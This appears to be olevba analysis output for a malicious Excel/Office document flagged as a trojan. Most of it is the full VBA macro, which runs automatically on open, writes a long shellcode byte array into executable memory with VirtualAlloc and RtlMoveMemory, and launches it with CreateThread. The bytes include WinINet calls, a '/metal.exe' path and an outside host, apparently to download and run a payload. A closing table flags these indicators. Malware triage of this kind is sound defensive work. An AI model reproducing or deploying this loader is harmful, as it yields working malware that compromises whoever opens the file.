olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSOffice.Shellex.sb-a3f128976fb477883db4f7ecc2aae05e61e2de224ad584454022aced8f8f5ca5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Trojan.MSOffice.Shellex.sb-a3f128976fb477883db4f7ecc2aae05e61e2de224ad584454022aced8f8f5ca5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Sna As Long, ByVal Ekeqyz As Long, ByVal Iciggaxc As LongPtr, Nlin As Long, ByVal Hhmuvx As Long, Ovdaxfn As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Gxdk As Long, ByVal Ehceqkkx As Long, ByVal Gkryn As Long, ByVal Tsa As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Xaprnto As LongPtr, ByRef Cztskpau As Any, ByVal Vtyiwscis As Long) As LongPtr
#Else
    Private Declare Function CreateThread Lib "kernel32" (ByVal Sna As Long, ByVal Ekeqyz As Long, ByVal Iciggaxc As Long, Nlin As Long, ByVal Hhmuvx As Long, Ovdaxfn As Long) As Long
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Gxdk As Long, ByVal Ehceqkkx As Long, ByVal Gkryn As Long, ByVal Tsa As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Xaprnto As Long, ByRef Cztskpau As Any, ByVal Vtyiwscis As Long) As Long
#End If

Sub Auto_Open()
    Dim Nhxbticl As Long, Wtnqycur As Variant, Ugqir As Long
#If VBA7 Then
    Dim Ezhyuw As LongPtr, Vowtv As LongPtr
#Else
    Dim Ezhyuw As Long, Vowtv As Long
#End If
    Wtnqycur = Array(252, 232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
207, 13, 1, 199, 56, 224, 117, 246, 3, 125, 248, 59, 125, 36, 117, 228, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 95, 95, 90, 139, 18, 235, 141, 93, 129, 196, 112, 254, 255, 255, 141, 84, 36, 96, 82, 104, 177, 74, 107, 177, 255, 213, 141, 68, 36, 96, 235, 96, _
94, 141, 120, 96, 87, 80, 49, 219, 83, 83, 104, 4, 0, 0, 8, 83, 83, 83, 86, 83, 104, 121, 204, 63, 134, 255, 213, 133, 192, 116, 84, 106, 64, 128, 199, 16, 83, 83, 49, 219, 83, 255, 55, 104, 174, 135, 146, 63, 255, 213, 84, 104, 190, 1, 0, 0, 235, 52, 80, 255, 55, 104, 197, 216, 189, 231, 255, 213, 83, 83, 83, 139, 76, 36, 252, 81, 83, 83, 255, 55, _
104, 198, 172, 154, 121, 255, 213, 106, 255, 104, 68, 240, 53, 224, 255, 213, 232, 155, 255, 255, 255, 114, 117, 110, 100, 108, 108, 51, 50, 0, 232, 199, 255, 255, 255, 252, 232, 137, 0, 0, 0, 96, 137, 229, 49, 210, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, _
240, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, 116, 74, 1, 208, 80, 139, 72, 24, 139, 88, 32, 1, 211, 227, 60, 73, 139, 52, 139, 1, 214, 49, 255, 49, 192, 172, 193, 207, 13, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, 36, 117, 226, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, _
68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, 235, 134, 93, 104, 110, 101, 116, 0, 104, 119, 105, 110, 105, 137, 230, 84, 104, 76, 119, 38, 7, 255, 213, 49, 255, 87, 87, 87, 87, 86, 104, 58, 86, 121, 167, 255, 213, 235, 96, 91, 49, 201, 81, 81, 106, 3, 81, 81, 106, 80, 83, 80, 104, 87, 137, 159, 198, 255, 213, 235, 79, 89, 49, 210, _
82, 104, 0, 50, 96, 132, 82, 82, 82, 81, 82, 80, 104, 235, 85, 46, 59, 255, 213, 137, 198, 106, 16, 91, 104, 128, 51, 0, 0, 137, 224, 106, 4, 80, 106, 31, 86, 104, 117, 70, 158, 134, 255, 213, 49, 255, 87, 87, 87, 87, 86, 104, 45, 6, 24, 123, 255, 213, 133, 192, 117, 30, 75, 15, 132, 123, 0, 0, 0, 235, 209, 233, 141, 0, 0, 0, 232, 172, 255, 255, _
255, 47, 109, 101, 116, 97, 108, 46, 101, 120, 101, 0, 235, 107, 49, 192, 95, 80, 106, 2, 106, 2, 80, 106, 2, 106, 2, 87, 104, 218, 246, 218, 79, 255, 213, 147, 49, 192, 102, 184, 4, 3, 41, 196, 84, 141, 76, 36, 8, 49, 192, 180, 3, 80, 81, 86, 104, 18, 150, 137, 226, 255, 213, 133, 192, 116, 45, 88, 133, 192, 116, 22, 106, 0, 84, 80, 141, 68, 36, 12, _
80, 83, 104, 45, 87, 174, 91, 255, 213, 131, 236, 4, 235, 206, 83, 104, 198, 150, 135, 82, 255, 213, 106, 0, 87, 104, 49, 139, 111, 135, 255, 213, 106, 0, 104, 240, 181, 162, 86, 255, 213, 232, 144, 255, 255, 255, 99, 104, 114, 111, 109, 101, 46, 101, 120, 101, 0, 232, 9, 255, 255, 255, 115, 104, 105, 110, 121, 111, 98, 106, 101, 99, 116, 115, 46, 98, 105, 114, 100, 115, _
0)

    Ezhyuw = VirtualAlloc(0, UBound(Wtnqycur), &H1000, &H40)
    For Ugqir = LBound(Wtnqycur) To UBound(Wtnqycur)
        Nhxbticl = Wtnqycur(Ugqir)
        Vowtv = RtlMoveMemory(Ezhyuw + Ugqir, Nhxbticl, 1)
    Next Ugqir
    Vowtv = CreateThread(0, 0, Ezhyuw, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Trojan.MSOffice.Shellex.sb-a3f128976fb477883db4f7ecc2aae05e61e2de224ad584454022aced8f8f5ca5 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Trojan.MSOffice.Shellex.sb-a3f128976fb477883db4f7ecc2aae05e61e2de224ad584454022aced8f8f5ca5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|CreateThread        |May inject code into another process         |
|Suspicious|VirtualAlloc        |May inject code into another process         |
|Suspicious|RtlMoveMemory       |May inject code into another process         |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

